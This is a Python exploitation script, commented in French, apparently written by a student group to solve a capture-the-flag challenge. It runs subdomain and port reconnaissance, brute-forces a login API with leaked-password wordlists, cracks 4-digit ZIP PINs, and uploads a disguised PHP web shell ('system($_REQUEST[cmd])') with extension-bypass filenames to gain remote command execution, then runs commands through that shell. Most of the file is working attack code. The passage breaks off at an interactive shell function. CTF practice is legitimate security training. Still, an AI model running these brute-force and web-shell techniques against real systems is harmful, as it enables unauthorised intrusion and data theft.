#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘           ROGUE SENTINELS - CTF EXPLOITATION FRAMEWORK v2                    â•‘
â•‘                   Full Pentest Methodology - Groupe F                        â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Script d'exploitation complet suivant la mÃ©thodologie pentest:
1. Reconnaissance DNS (sous-domaines)
2. Scan de ports (Nmap)
3. EnumÃ©ration (Gobuster/Dirbuster)
4. Exploitation spÃ©cifique Ã  chaque vulnÃ©rabilitÃ©
"""

import os
import sys
import time
import requests
import subprocess
import socket
import zipfile
import base64
import re
import io
import json
import tempfile
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, quote

# DÃ©sactiver les warnings SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# COULEURS ET UTILITAIRES
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    print(f"""{Colors.CYAN}
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—  â•‘
â•‘  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘  â•‘
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘  â•‘
â•‘  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•      â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â•‘
â•‘  â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘  â•‘
â•‘  â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•    â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•  â•‘
â•‘                                                                              â•‘
â•‘            CTF FULL PENTEST FRAMEWORK - Groupe F                        â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
{Colors.ENDC}""")

def print_success(msg): print(f"{Colors.GREEN}[+] {msg}{Colors.ENDC}")
def print_error(msg): print(f"{Colors.RED}[-] {msg}{Colors.ENDC}")
def print_info(msg): print(f"{Colors.BLUE}[*] {msg}{Colors.ENDC}")
def print_warning(msg): print(f"{Colors.YELLOW}[!] {msg}{Colors.ENDC}")
def print_flag(flag):
    print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*60}")
    print(f"  ğŸš© FLAG CAPTURÃ‰: {flag}")
    print(f"{'='*60}{Colors.ENDC}\n")

def print_section(title):
    print(f"\n{Colors.HEADER}{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}{Colors.ENDC}\n")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def pause():
    input(f"\n{Colors.CYAN}Appuyez sur EntrÃ©e pour continuer...{Colors.ENDC}")

def run_command(cmd, timeout=60):
    """ExÃ©cuter une commande shell et retourner le rÃ©sultat"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "TIMEOUT"
    except Exception as e:
        return f"ERROR: {e}"

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# FONCTIONS DE CHARGEMENT DES WORDLISTS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def load_wordlist(filename):
    """Charger une wordlist depuis le rÃ©pertoire wordlists/"""
    try:
        # Obtenir le chemin absolu du script
        script_dir = os.path.dirname(os.path.abspath(__file__))
        # Remonter d'un niveau pour atteindre le root du projet
        project_root = os.path.dirname(script_dir)
        wordlist_path = os.path.join(project_root, 'wordlists', filename)

        with open(wordlist_path, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f.readlines() if line.strip()]
        print_success(f"Wordlist chargÃ©e: {filename} ({len(lines)} entrÃ©es)")
        return lines
    except FileNotFoundError:
        print_error(f"Wordlist non trouvÃ©e: {filename}")
        return []
    except Exception as e:
        print_error(f"Erreur lors du chargement de {filename}: {e}")
        return []

# Charger les wordlists depuis les fichiers du repository
COMMON_SUBDOMAINS = load_wordlist('common_subdomains.txt')
COMMON_PASSWORDS = load_wordlist('leaked_passwords.txt')
COMMON_URLS = load_wordlist('common_urls.txt')
COMMON_USERS = load_wordlist('leaked_users.txt')

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# PHASE 0: RECONNAISSANCE INITIALE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Reconnaissance:
    """Phase de reconnaissance: DNS, ports, services"""
    
    def __init__(self, base_domain="rogue-sentinels.io"):
        self.base_domain = base_domain
        self.discovered_subdomains = []
        self.discovered_services = {}
        
    def run_full_recon(self):
        """ExÃ©cuter la reconnaissance complÃ¨te"""
        clear_screen()
        print_section("PHASE 0: RECONNAISSANCE INITIALE")
        
        print_info(f"Cible: {self.base_domain}")
        
        # Ã‰tape 1: EnumÃ©ration DNS
        print_info("\n[1/3] EnumÃ©ration des sous-domaines...")
        self.enumerate_subdomains()
        
        # Ã‰tape 2: Scan de ports
        print_info("\n[2/3] Scan des ports...")
        self.scan_ports()
        
        # Ã‰tape 3: Identification des services
        print_info("\n[3/3] Identification des services...")
        self.identify_services()
        
        # RÃ©sumÃ©
        self.print_summary()
        
        return self.discovered_services
    
    def enumerate_subdomains(self):
        """Trouver les sous-domaines actifs"""
        print_info(f"Test de {len(COMMON_SUBDOMAINS)} sous-domaines...")
        
        found = []
        
        for subdomain in COMMON_SUBDOMAINS:
            fqdn = f"{subdomain}.{self.base_domain}"
            
            # Test DNS
            try:
                ip = socket.gethostbyname(fqdn)
                print_success(f"{fqdn} -> {ip}")
                found.append({'subdomain': subdomain, 'fqdn': fqdn, 'ip': ip})
            except socket.gaierror:
                pass
        
        # Test aussi le domaine principal
        try:
            ip = socket.gethostbyname(self.base_domain)
            print_success(f"{self.base_domain} -> {ip}")
            found.append({'subdomain': '', 'fqdn': self.base_domain, 'ip': ip})
        except:
            pass
        
        self.discovered_subdomains = found
        print_info(f"\nTotal: {len(found)} sous-domaines trouvÃ©s")
        
        return found
    
    def scan_ports(self):
        """Scanner les ports sur chaque sous-domaine"""
        
        # Ports courants Ã  scanner
        common_ports = [21, 22, 80, 443, 3000, 5000, 8000, 8080, 8443, 9000, 
                       19480, 64375]  # Ports spÃ©cifiques au CTF
        
        for entry in self.discovered_subdomains:
            fqdn = entry['fqdn']
            ip = entry['ip']
            
            print_info(f"\nScan de {fqdn} ({ip})...")
            
            open_ports = []
            
            # Essayer nmap si disponible
            nmap_result = run_command(f"nmap -p- --min-rate=1000 -T4 {ip} 2>/dev/null | grep ^[0-9]", timeout=120)
            
            if "open" in nmap_result:
                # Parser les rÃ©sultats nmap
                for line in nmap_result.split('\n'):
                    if 'open' in line:
                        port = line.split('/')[0]
                        try:
                            open_ports.append(int(port))
                            print_success(f"  Port {port}: ouvert")
                        except:
                            pass
            else:
                # Fallback: scan manuel des ports courants
                for port in common_ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        result = sock.connect_ex((ip, port))
                        sock.close()
                        
                        if result == 0:
                            open_ports.append(port)
                            print_success(f"  Port {port}: ouvert")
                    except:
                        pass
            
            entry['ports'] = open_ports
    
    def identify_services(self):
        """Identifier les services sur chaque port"""
        
        for entry in self.discovered_subdomains:
            fqdn = entry['fqdn']
            subdomain = entry['subdomain']
            
            for port in entry.get('ports', []):
                service_key = f"{subdomain}:{port}" if subdomain else f"main:{port}"
                
                # Tester HTTP/HTTPS
                for protocol in ['http', 'https']:
                    url = f"{protocol}://{fqdn}:{port}"
                    try:
                        r = requests.get(url, timeout=5, verify=False)
                        
                        # Identifier le service
                        service_info = {
                            'url': url,
                            'fqdn': fqdn,
                            'port': port,
                            'protocol': protocol,
                            'status': r.status_code,
                            'title': '',
                            'server': r.headers.get('Server', ''),
                            'technology': []
                        }
                        
                        # Extraire le titre
                        title_match = re.search(r'<title>([^<]+)</title>', r.text, re.I)
                        if title_match:
                            service_info['title'] = title_match.group(1)
                        
                        # Identifier les technologies
                        if 'geoserver' in r.text.lower():
                            service_info['technology'].append('GeoServer')
                        if 'upload' in r.text.lower():
                            service_info['technology'].append('FileUpload')
                        if 'login' in r.text.lower() or 'auth' in r.text.lower():
                            service_info['technology'].append('Authentication')
                        if 'calculator' in r.text.lower() or 'adder' in r.text.lower():
                            service_info['technology'].append('Calculator')
                        
                        self.discovered_services[service_key] = service_info
                        print_success(f"  {url} - {service_info['title'] or 'No title'}")
                        break  # Si HTTP marche, pas besoin de tester HTTPS
                        
                    except:
                        pass
    
    def print_summary(self):
        """Afficher le rÃ©sumÃ© de la reconnaissance"""
        print_section("RÃ‰SUMÃ‰ DE LA RECONNAISSANCE")
        
        print(f"{Colors.BOLD}Sous-domaines dÃ©couverts:{Colors.ENDC}")
        for entry in self.discovered_subdomains:
            ports_str = ', '.join(map(str, entry.get('ports', [])))
            print(f"  â€¢ {entry['fqdn']} ({entry['ip']}) - Ports: {ports_str or 'aucun'}")
        
        print(f"\n{Colors.BOLD}Services identifiÃ©s:{Colors.ENDC}")
        for key, service in self.discovered_services.items():
            tech_str = ', '.join(service['technology']) if service['technology'] else 'Unknown'
            print(f"  â€¢ {service['url']}")
            print(f"    Title: {service['title'] or 'N/A'}")
            print(f"    Tech: {tech_str}")
            print()


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNÃ‰RABILITÃ‰ #1: FileServer - Bruteforce + ZIP Cracking
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit1_FileServer:
    """
    Exploitation du FileServer:
    1. EnumÃ©ration des fichiers sensibles (.htaccess)
    2. Bruteforce de l'authentification
    3. Exploration du filesystem
    4. TÃ©lÃ©chargement et bruteforce des ZIP
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        self.email = None
        self.password = None
        self.token = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #1: FileServer - Bruteforce + ZIP Cracking")
        
        # Configuration
        print_info("Configuration du service:")
        host = input(f"{Colors.CYAN}Host (dÃ©faut: fileserver.rogue-sentinels.io): {Colors.ENDC}") or "fileserver.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (dÃ©faut: 8080): {Colors.ENDC}") or "8080"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Cible: {self.base_url}")
        
        # Mode d'exploitation
        print_info("\nOptions:")
        print("  [1] Exploitation complÃ¨te (enumÃ©ration â†’ bruteforce â†’ extraction)")
        print("  [2] Injection directe du token JWT")
        mode = input(f"{Colors.CYAN}Choix (1/2): {Colors.ENDC}") or "1"
        
        if mode == "2":
            self.token = input(f"{Colors.YELLOW}Token JWT: {Colors.ENDC}").strip()
            self.session.headers['Authorization'] = f"Bearer {self.token}"
            # Aussi en cookie pour compatibilitÃ©
            self.session.cookies.set('token', self.token)
        else:
            # Ã‰tape 1: EnumÃ©ration
            print_info("\n[Ã‰tape 1] EnumÃ©ration des fichiers sensibles...")
            self.enumerate_files()
            
            # Ã‰tape 2: Bruteforce password
            print_info("\n[Ã‰tape 2] Bruteforce de l'authentification...")
            if not self.bruteforce_auth():
                print_error("Ã‰chec du bruteforce")
                manual_pass = input(f"{Colors.YELLOW}Mot de passe manuel: {Colors.ENDC}")
                if manual_pass:
                    self.password = manual_pass
                    self.authenticate()
        
        # Ã‰tape 3: Exploration du filesystem
        print_info("\n[Ã‰tape 3] Exploration du filesystem...")
        zip_files = self.explore_filesystem()
        
        # Ã‰tape 4: TÃ©lÃ©chargement et crack des ZIP
        print_info("\n[Ã‰tape 4] TÃ©lÃ©chargement et crack des ZIP...")
        flag = self.crack_zips(zip_files)
        
        if flag:
            print_flag(flag)
        else:
            print_error("Flag non trouvÃ©")
        
        pause()
        return flag
    
    def enumerate_files(self):
        """Chercher les fichiers sensibles exposÃ©s"""
        
        sensitive_files = ['.htaccess', '.htpasswd', 'robots.txt', '.git/config', 
                         '.env', 'config.php', 'config.json']
        
        for file in sensitive_files:
            try:
                r = self.session.get(f"{self.base_url}/{file}", timeout=5)
                if r.status_code == 200 and len(r.text) > 0:
                    print_success(f"Fichier trouvÃ©: {file}")
                    print_info(f"Contenu:\n{r.text[:500]}")
                    
                    # Chercher des emails
                    emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', r.text)
                    if emails:
                        self.email = emails[0]
                        print_success(f"Email trouvÃ©: {self.email}")
            except:
                pass
        
        if not self.email:
            self.email = input(f"{Colors.YELLOW}Email (dÃ©faut: security-admin@web2000-corp.com): {Colors.ENDC}") or "security-admin@web2000-corp.com"
    
    def bruteforce_auth(self):
        """Bruteforce du mot de passe"""
        
        # Mots de passe du toolkit
        passwords = COMMON_PASSWORDS
        
        print_info(f"Email cible: {self.email}")
        print_info(f"Test de {len(passwords)} mots de passe...")
        
        for pwd in passwords:
            try:
                data = {"email": self.email, "password": pwd}
                r = self.session.post(f"{self.base_url}/api/v1/auth", json=data, timeout=5)
                
                if r.status_code == 200:
                    try:
                        resp = r.json()
                        if 'token' in resp:
                            self.password = pwd
                            self.token = resp['token']
                            self.session.headers['Authorization'] = f"Bearer {self.token}"
                            self.session.cookies.set('token', self.token)
                            print_success(f"Mot de passe trouvÃ©: {pwd}")
                            print_success(f"Token: {self.token[:50]}...")
                            return True
                    except:
                        pass
            except:
                pass
        
        return False
    
    def authenticate(self):
        """S'authentifier avec les credentials"""
        try:
            data = {"email": self.email, "password": self.password}
            r = self.session.post(f"{self.base_url}/api/v1/auth", json=data, timeout=5)
            
            if r.status_code == 200:
                resp = r.json()
                if 'token' in resp:
                    self.token = resp['token']
                    self.session.headers['Authorization'] = f"Bearer {self.token}"
                    self.session.cookies.set('token', self.token)
                    print_success(f"Authentification rÃ©ussie!")
                    return True
        except Exception as e:
            print_error(f"Erreur: {e}")
        
        return False
    
    def explore_filesystem(self):
        """Explorer le filesystem pour trouver les backups"""

        zip_files = []

        # Endpoints de base Ã  tester
        base_endpoint = [
            '/api/v1/folder?folder=',
        ]

        # Utiliser la wordlist des URLs pour les chemins Ã  tester
        print_info(f"Utilisation de la wordlist: {len(COMMON_URLS)} chemins Ã  tester")
        endpoints = base_endpoint.copy()

        # Ajouter tous les chemins de la wordlist
        for path in COMMON_URLS:
            endpoints.append(f'/api/v1/folder?folder={path}')

        print_info(f"Total: {len(endpoints)} endpoints Ã  tester")

        for endpoint in endpoints:
            try:
                r = self.session.get(f"{self.base_url}{endpoint}", timeout=5)

                if r.status_code == 200:
                    print_success(f"Endpoint accessible: {endpoint}")
                    print_info(f"RÃ©ponse: {r.text[:200]}")

                    # Chercher des fichiers ZIP
                    zip_matches = re.findall(r'[\w\-\_\.]+\.zip', r.text)
                    for z in zip_matches:
                        if z not in zip_files:
                            zip_files.append(z)
                            print_info(f"  ZIP: {z}")

                    # Parser JSON
                    try:
                        data = r.json()
                        if isinstance(data, list):
                            for item in data:
                                if isinstance(item, str) and item.endswith('.zip'):
                                    if item not in zip_files:
                                        zip_files.append(item)
                    except:
                        pass

                    # Si on a trouvÃ© des ZIPs, arrÃªter la recherche
                    if zip_files:
                        print_success(f"TrouvÃ© {len(zip_files)} fichier(s) ZIP, arrÃªt de la recherche")
                        break
            except:
                pass
        
        # Si aucun ZIP trouvÃ©, gÃ©nÃ©ration manuelle
        if not zip_files:
            print_warning("Aucun ZIP trouvÃ©. GÃ©nÃ©ration de la liste...")
            print_info("Commande curl pour explorer:")
            print(f"{Colors.CYAN}curl -b 'token={self.token}' '{self.base_url}/api/v1/folder?folder=backups'{Colors.ENDC}")
            
            pattern = input(f"{Colors.YELLOW}Pattern ZIP (dÃ©faut: backup_2001_): {Colors.ENDC}") or "backup_2001_"
            start = int(input(f"{Colors.YELLOW}DÃ©but (dÃ©faut: 124): {Colors.ENDC}") or "124")
            end = int(input(f"{Colors.YELLOW}Fin (dÃ©faut: 350): {Colors.ENDC}") or "350")
            
            for i in range(start, end + 1):
                zip_files.append(f"{pattern}{i}.zip")
        
        print_info(f"\nTotal: {len(zip_files)} fichiers ZIP Ã  traiter")
        return zip_files
    
    def download_zip(self, filename):
        """TÃ©lÃ©charger un fichier ZIP"""
        
        urls = [
            f"{self.base_url}/api/v1/download?file={filename}",
            f"{self.base_url}/api/v1/file?file={filename}",
            f"{self.base_url}/api/v1/files/{filename}",
        ]
        
        for url in urls:
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200 and len(r.content) > 100:
                    # VÃ©rifier magic bytes
                    if r.content[:2] == b'PK':
                        return r.content
            except:
                pass
        
        return None
    
    def crack_zip(self, zip_content, filename):
        """Bruteforce le PIN 4 chiffres"""
        
        try:
            zip_buffer = io.BytesIO(zip_content)
            
            # Tester PINs de 1000 Ã  9999
            for pin in range(1000, 10000):
                pin_str = str(pin)
                
                try:
                    with zipfile.ZipFile(zip_buffer, 'r') as zf:
                        zf.setpassword(pin_str.encode())
                        
                        for name in zf.namelist():
                            try:
                                content = zf.read(name)
                                content_str = content.decode('utf-8', errors='ignore')
                                
                                # Flag trouvÃ©?
                                if 'FLAG' in content_str or 'flag' in content_str.lower():
                                    print_success(f"PIN trouvÃ©: {pin_str}")
                                    return pin_str, content_str
                                
                                # Si on peut lire, c'est le bon PIN
                                print_success(f"PIN trouvÃ©: {pin_str}")
                                return pin_str, content_str
                            except RuntimeError:
                                # Mauvais mot de passe
                                break
                            except:
                                break
                except:
                    pass
                
                zip_buffer.seek(0)
                
                if pin % 1000 == 0:
                    print(f"  Testing PIN: {pin}...", end='\r')
                    
        except Exception as e:
            print_error(f"Erreur: {e}")
        
        return None, None
    
    def crack_zips(self, zip_files):
        """TÃ©lÃ©charger et cracker tous les ZIP"""
        
        for filename in zip_files:
            print_info(f"Traitement: {filename}")
            
            # TÃ©lÃ©charger
            content = self.download_zip(filename)
            if not content:
                continue
            
            print_success(f"  TÃ©lÃ©chargÃ©: {len(content)} bytes")
            
            # Cracker
            pin, file_content = self.crack_zip(content, filename)
            
            if pin and file_content:
                # Chercher le flag
                flag_match = re.search(r'FLAG[_\-\w]+', file_content, re.I)
                if flag_match:
                    return flag_match.group(0)
                
                # Afficher le contenu
                print_info(f"Contenu:\n{file_content[:500]}")
                
                user_flag = input(f"{Colors.YELLOW}Flag trouvÃ©? (copier ou EntrÃ©e): {Colors.ENDC}")
                if user_flag:
                    return user_flag
        
        return None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNÃ‰RABILITÃ‰ #2: Travel - File Upload RCE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit2_Travel:
    """
    Exploitation de Travel via File Upload:
    1. Upload d'un shell PHP dÃ©guisÃ© (.png.php)
    2. AccÃ¨s au shell
    3. Recherche du flag
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        self.shell_url = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #2: Travel - File Upload RCE")
        
        # Configuration
        host = input(f"{Colors.CYAN}Host (dÃ©faut: travel.rogue-sentinels.io): {Colors.ENDC}") or "travel.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (dÃ©faut: 80): {Colors.ENDC}") or "80"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Cible: {self.base_url}")
        
        # Ã‰tape 1: Reconnaissance
        print_info("\n[Ã‰tape 1] Reconnaissance...")
        self.recon()
        
        # Ã‰tape 2: Upload du shell
        print_info("\n[Ã‰tape 2] Upload du shell PHP...")
        if not self.upload_shell():
            print_warning("Upload automatique Ã©chouÃ©")
            print_info("Upload manuel:")
            print(f"{Colors.CYAN}curl -X POST {self.base_url}/photos.php -F file=@shell.png.php{Colors.ENDC}")
            input(f"{Colors.YELLOW}Appuyez sur EntrÃ©e aprÃ¨s l'upload manuel...{Colors.ENDC}")
        
        # Ã‰tape 3: Trouver le shell
        print_info("\n[Ã‰tape 3] Localisation du shell...")
        if not self.find_shell():
            self.shell_url = input(f"{Colors.YELLOW}URL du shell: {Colors.ENDC}")
        
        # Ã‰tape 4: Exploitation
        print_info("\n[Ã‰tape 4] Recherche du flag...")
        flag = self.find_flag()
        
        if flag:
            print_flag(flag)
        
        # Shell interactif
        self.interactive_shell()
        
        pause()
        return flag
    
    def recon(self):
        """Reconnaissance de l'application"""
        try:
            r = self.session.get(self.base_url, timeout=10)
            print_success(f"Application accessible (Status: {r.status_code})")
            
            # Identifier l'application
            if 'salmon' in r.text.lower():
                print_info("Application: The Happy Salmon")
            if 'upload' in r.text.lower() or 'photo' in r.text.lower():
                print_success("FonctionnalitÃ© d'upload dÃ©tectÃ©e")
            
            # Chercher les endpoints
            forms = re.findall(r'action=["\']([^"\']+)["\']', r.text)
            for form in forms:
                print_info(f"Formulaire: {form}")
                
        except Exception as e:
            print_error(f"Erreur: {e}")
    
    def upload_shell(self):
        """Upload du shell PHP"""
        
        # Shell PHP simple
        shell_content = b'<?php system($_REQUEST["cmd"]); ?>'
        
        # Endpoint d'upload (from toolkit)
        upload_url = f"{self.base_url}/photos.php"
        
        # DiffÃ©rentes techniques
        attempts = [
            ('shell.png.php', 'image/png'),
            ('shell.php.png', 'image/png'),
            ('shell.phtml', 'image/png'),
            ('shell.php', 'application/x-php'),
        ]
        
        for filename, mimetype in attempts:
            try:
                files = {'file': (filename, shell_content, mimetype)}
                r = self.session.post(upload_url, files=files, timeout=10)
                
                if r.status_code == 200:
                    if 'error' not in r.text.lower() and 'invalid' not in r.text.lower():
                        print_success(f"Shell uploadÃ©: {filename}")
                        self.shell_filename = filename
                        return True
                    else:
                        print_warning(f"{filename}: RejetÃ©")
            except Exception as e:
                print_error(f"Erreur upload: {e}")
        
        return False
    
    def find_shell(self):
        """Trouver le shell uploadÃ©"""
        
        # RÃ©pertoires courants
        dirs = ['/salmon-uploads/', '/uploads/', '/images/', '/photos/', 
                '/pictures/', '/img/', '/files/']
        
        filename = getattr(self, 'shell_filename', 'shell.png.php')
        
        for d in dirs:
            url = f"{self.base_url}{d}{filename}"
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    # Tester si le shell fonctionne
                    test_url = f"{url}?cmd=id"
                    test_r = self.session.get(test_url, timeout=5)
                    if 'uid=' in test_r.text or 'www-data' in test_r.text:
                        print_success(f"Shell trouvÃ©: {url}")
                        self.shell_url = url
                        return True
            except:
                pass
        
        return False
    
    def exec_cmd(self, cmd):
        """ExÃ©cuter une commande via le shell"""
        try:
            r = self.session.get(f"{self.shell_url}?cmd={quote(cmd)}", timeout=10)
            return r.text
        except:
            return None
    
    def find_flag(self):
        """Rechercher le flag"""
        
        commands = [
            "grep -r 'FLAG' /var/www/ 2>/dev/null | head -10",
            "cat /var/www/html/reservations.php 2>/dev/null | grep -i flag",
            "find /var/www -name '*.php' -exec grep -l FLAG {} \\; 2>/dev/null",
            "cat /var/www/html/*.php 2>/dev/null",
        ]
        
        for cmd in commands:
            print_info(f"ExÃ©cution: {cmd}")
            result = self.exec_cmd(cmd)
            
            if result:
                # Chercher un flag
                flag_match = re.search(r'FLAG[_\-\w]+', result, re.I)
                if flag_match:
                    return flag_match.group(0)
                
                if 'flag' in result.lower():
                    print(result[:500])
        
        return None
    
    def interactive_shell(self):
        """Shell interactif"""
